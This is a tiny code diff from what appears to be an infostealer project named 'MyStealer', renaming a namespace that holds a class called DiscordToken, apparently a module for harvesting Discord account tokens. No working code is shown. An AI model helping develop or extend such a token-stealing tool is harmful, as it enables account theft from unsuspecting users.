@@ -1,4 +1,4 @@
-﻿namespace MyStealer.Modules.AccessKey
+﻿namespace MyStealer.Collectors.AccessKey
 {
     internal class DiscordToken
     {
